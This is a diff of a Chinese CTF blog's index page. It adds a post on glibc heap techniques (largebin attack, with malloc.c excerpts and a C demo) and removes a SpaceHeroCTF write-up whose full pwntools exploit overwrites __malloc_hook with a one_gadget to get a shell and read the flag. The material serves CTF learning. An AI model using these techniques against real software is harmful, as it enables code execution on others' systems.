@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">29</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">31</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">20</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">21</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,132 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/07/12/exploitation-in-latest-glibc-0x00/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/12/exploitation-in-latest-glibc-0x00/" class="post-title-link" itemprop="url">exploitation-in-latest-glibc-0x00</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-07-12 22:03:31 / 修改时间：15:59:26" itemprop="dateCreated datePublished" datetime="2022-07-12T22:03:31+08:00">2022-07-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>现在很多赛题都围绕着<code>glibc2.31~2.34</code>下的利用来考，故在此总结一下:  </p>
+<ul>
+<li><a href="#largebin-attack">largebin-attack</a></li>
+<li>House_of_pig</li>
+<li>tcache_attack<ul>
+<li>modify TLS</li>
+<li>modify mp_</li>
+<li><a href="#tcache_stashing_unlink_attack">tcache stashing unlink attack</a></li>
+</ul>
+</li>
+<li>House_of_Emma    </li>
+<li>House_of_kiwi</li>
+<li>House_of_banana</li>
+</ul>
+<hr>
+<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin-attack"></a>largebin-attack</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><code>largebin-attack</code>在新版本( <code>&gt;= glibc2.31</code> )下的利用思路比较固定，利用点在于触发<code>malloc_consolidate</code>将<code>size &gt; 0x408</code>且不与<code>top_chunk</code>相邻的块整理到<code>largebin</code>中时缺少相应的安全性检查:  </p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://ftp.gnu.org/gnu/glibc/glibc-2.3.3.tar.gz">glibc2.33</a>&#x2F;malloc&#x2F;malloc.c-line:3891:  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim_index = <span class="built_in">largebin_index</span> (size);</span><br><span class="line">	bck = <span class="built_in">bin_at</span> (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">	<span class="keyword">if</span> (fwd != bck)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">		size |= PREV_INUSE;</span><br><span class="line">		<span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">		<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (bck-&gt;bk));</span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk))</span><br><span class="line">		&#123;</span><br><span class="line">			fwd = bck;</span><br><span class="line">			bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">			victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">			victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">			fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (fwd));</span><br><span class="line">			<span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; <span class="built_in">chunksize_nomask</span> (fwd))</span><br><span class="line">			&#123;</span><br><span class="line">				fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">				<span class="built_in">assert</span> (<span class="built_in">chunk_main_arena</span> (fwd));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (fwd))</span><br><span class="line">				<span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">				fwd = fwd-&gt;fd;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				victim-&gt;fd_nextsize = fwd;</span><br><span class="line">				victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">				<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">					<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">				fwd-&gt;bk_nextsize = victim;</span><br><span class="line">				victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">			&#125;</span><br><span class="line">			bck = fwd-&gt;bk;</span><br><span class="line">			<span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">				<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与利用相关的关键逻辑在于:  当一个比<code>largebin</code>当前链表中堆块小的块进入时，会触发排序，造成:  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>即将这个<code>chunk</code>的地址写入<code>bk_nextsize+0x20</code>处，因此利用时的构造思路也比较固定:  </p>
+<ul>
+<li>申请一个大的<code>chunk0</code>与一个略小的<code>chunk1</code>，保证二者的大小满足处于同一条<code>largebin</code>链上</li>
+<li>释放<code>chunk0</code>进入<code>unsortedbin</code>，然后申请一个更大的<code>chunk2</code>触发<code>malloc_consolidate</code>把<code>chunk0</code>放进<code>largebin</code>中</li>
+<li>释放<code>chunk1</code>进入<code>unsortedbin</code>，同时借助漏洞修改<code>chunk0-&gt;bk_nextsize = &amp;target-0x20</code></li>
+<li>申请一个大堆块触发<code>malloc_consolidate</code>把<code>chunk1</code>也放进<code>largebin</code>中</li>
+<li><strong>构造时要记得隔开几个堆块避免合并</strong></li>
+</ul>
+<hr>
+<h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> *chunk0 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">	<span class="type">size_t</span> *unused = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="type">size_t</span> *unuseD = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk0);</span><br><span class="line">	<span class="type">size_t</span> *unusED = <span class="built_in">malloc</span>(<span class="number">0x520</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	<span class="comment">// chunk0[3] = (size_t)((&amp;target)-4);</span></span><br><span class="line">	*(<span class="type">size_t</span> *)((<span class="type">char</span> *)chunk0 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)((<span class="type">char</span>*)(&amp;target)<span class="number">-0x20</span>);</span><br><span class="line">	<span class="type">size_t</span> *unuSED = <span class="built_in">malloc</span>(<span class="number">0x520</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, target);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>根据上面的构造模板，不需要知道原理也能直接使用<code>largebin_attack</code>将任意地址的值改为堆上的一个地址，这时候就可以联想到:  </p>
+<ul>
+<li>global_max_fast</li>
+<li>mp_.tcache_bins<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/PCB-2022/A_fruit">鹏城杯-online-2022-A_fruit</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -752,116 +878,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/04/04/SpaceHeroCTF-2022-rings-of-saturn-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/04/SpaceHeroCTF-2022-rings-of-saturn-writeup/" class="post-title-link" itemprop="url">SpaceHeroCTF-2022-rings_of_saturn-writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-04 11:04:25 / 修改时间：19:13:36" itemprop="dateCreated datePublished" datetime="2022-04-04T11:04:25+08:00">2022-04-04</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
-<li>chunk-overlap</li>
-<li><code>one_gadget</code>遇到<code>rsp</code>对齐问题时的办法<ul>
-<li><code>malloc_hook</code>调用<code>realloc + offset</code></li>
-<li>利用<code>realloc    </code>调用<code>realloc_hook</code>前的一系列<code>push</code>语句调整栈</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目中的结构体主要是个循环链表:  </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">buf_ent</span> &#123;</span><br><span class="line">    <span class="type">char</span> *write_head;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">buf_ent</span> *next;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ringbuf</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">buf_ent</span> *head;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">buf_ent</span> *tail;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">buf_ent</span> *write_head;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>主要漏洞点在于<code>init</code>函数里面:  </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6 = (listNode *)<span class="built_in">calloc</span>(((total_sz_in - v3 + <span class="number">15</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL) + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br></pre></td></tr></table></figure>
-
-<p>因此输入1016时，就可以控制下个chunk的fd域，在tcache中就可以直接拿到任意地址写.</p>
-<hr>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="one-gadget-调用失败"><a href="#one-gadget-调用失败" class="headerlink" title="one_gadget 调用失败"></a>one_gadget 调用失败</h3><p>按照上述方法任意写<code>__malloc_hook</code>为<code>one_gadget</code>后运行不成功，gdb调试发现卡在:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;do_system+1094&gt;    movaps xmmword ptr [rsp + 0x40], xmm0</span><br></pre></td></tr></table></figure>
-
-<p>这是rsp没对齐导致的.</p>
-<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>在栈题里会想到ROP链中加一个ret来抬高rsp，在堆题里则需要借助<code>realloc</code>开头的一段:  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; __GI___libc_realloc</span><br><span class="line"></span><br><span class="line">&lt;+0&gt;:     push   r15</span><br><span class="line">&lt;+2&gt;:     push   r14</span><br><span class="line">&lt;+4&gt;:     push   r13</span><br><span class="line">&lt;+6&gt;:     push   r12</span><br><span class="line">&lt;+8&gt;:     push   rbp</span><br><span class="line">&lt;+9&gt;:     push   rbx</span><br><span class="line">&lt;+10&gt;:    sub    rsp,0x18</span><br><span class="line"></span><br><span class="line">;...</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line"></span><br><span class="line">remote_service = <span class="string">&quot;0.cloud.chals.io 12053&quot;</span></span><br><span class="line">remote_service = remote_service.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">p = remote(remote_service[<span class="number">0</span>], <span class="built_in">int</span>(remote_service[<span class="number">1</span>]))</span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment"># p = process(filename)</span></span><br><span class="line">e = ELF(filename, checksec=<span class="literal">False</span>)</span><br><span class="line">l = ELF(e.libc.path, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span> : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span> : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span> : gdb.attach(p, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">cmd = <span class="keyword">lambda</span> x : p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(x).encode())</span><br><span class="line">sda = <span class="keyword">lambda</span> x : p.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debugPID</span>():</span><br><span class="line">	lg(<span class="string">&quot;p.pid&quot;</span>)</span><br><span class="line">	<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFLAG</span>():</span><br><span class="line">	p.recv()</span><br><span class="line">	sl(<span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">	flag = ru(<span class="string">b&quot;\n&quot;</span>, <span class="string">&quot;drop&quot;</span>)</span><br><span class="line">	log.success(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_libc_base</span></span><br><span class="line">ru(<span class="string">b&quot;one_gadget lol 0x&quot;</span>)</span><br><span class="line">one_gadget = <span class="built_in">int</span>(ru(<span class="string">b&quot;\n&quot;</span>, <span class="string">&quot;drop&quot;</span>), <span class="number">16</span>)</span><br><span class="line">libc_base  = (one_gadget - <span class="number">0xC195</span>) - l.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;one_gadget-libc_base&quot;</span>)</span><br><span class="line">malloc_hook  = libc_base + l.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;one_gadget&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># init_size_of(1000+0x10)</span></span><br><span class="line">total_size = <span class="number">1016</span></span><br><span class="line">cmd(total_size)</span><br><span class="line">cmd(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add one chunk before freeing it into tcache</span></span><br><span class="line">cmd(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1000</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite tcache_chunk&#x27;s fd with malloc_hook-0x20(realloc_hook-0x18)</span></span><br><span class="line"><span class="comment"># So we can overwrite malloc_hook and realloc_hook at the same time</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">cmd(total_size)</span><br><span class="line">target_addr = malloc_hook-<span class="number">0x20</span></span><br><span class="line">sda((<span class="string">b&quot;a&quot;</span>*<span class="number">1000</span> + p64(<span class="number">0x411</span>) + p64(target_addr)).ljust(total_size, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc into target_addr</span></span><br><span class="line">cmd(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1000</span>)</span><br><span class="line">cmd(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_hook  &lt;== &amp;realloc+2</span></span><br><span class="line"><span class="comment"># realloc_hook &lt;== one_gadget</span></span><br><span class="line">ru(<span class="string">b&quot;What would you like to do?\n&quot;</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">pa_len = <span class="number">0x3e8</span>+<span class="number">0x10</span>+<span class="number">0x3e8</span>+<span class="number">0x3e8</span></span><br><span class="line">lg(<span class="string">&quot;libc_base+l.symbols[&#x27;realloc&#x27;]&quot;</span>)</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4f3c2</span></span><br><span class="line">payload = (<span class="string">b&quot;a&quot;</span>*(<span class="number">0x3e8</span>+<span class="number">0x10</span>) + p64(one_gadget) + p64(libc_base+l.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">2</span>)).ljust(pa_len, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">cmd(pa_len)</span><br><span class="line">sda(payload)</span><br><span class="line">sn(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">sl(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">cmd(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">getFLAG()</span><br><span class="line"><span class="comment"># shctf&#123;r0und_and_r0und_we_go&#125;</span></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -929,7 +949,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -942,7 +962,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">31</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -987,13 +1007,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">81k</span>
+    <span title="站点总字数">84k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:14</span>
+    <span title="站点阅读时长">1:16</span>
 </div>
